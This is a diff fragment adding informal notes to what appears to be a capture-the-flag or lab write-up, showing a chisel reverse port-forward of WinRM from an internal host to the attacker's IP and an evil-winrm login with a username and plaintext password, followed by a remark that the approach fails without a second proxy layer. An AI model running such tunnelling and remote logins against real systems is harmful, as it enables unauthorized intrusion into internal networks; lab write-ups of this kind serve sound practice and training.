@@ -254,4 +254,18 @@ exploit
 
 this might be different for different people
 
+### lets try without using reverse proxy
+
+./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
+
+
+now we simply run evilwinrm
+
+to get access
+
+evil-winrm -i 10.10.16.24 -u matthew -p 147258369
+
+since 10.10.16.24 is our ip
+
+this will not wokr because then it needs two layers of proxy
 
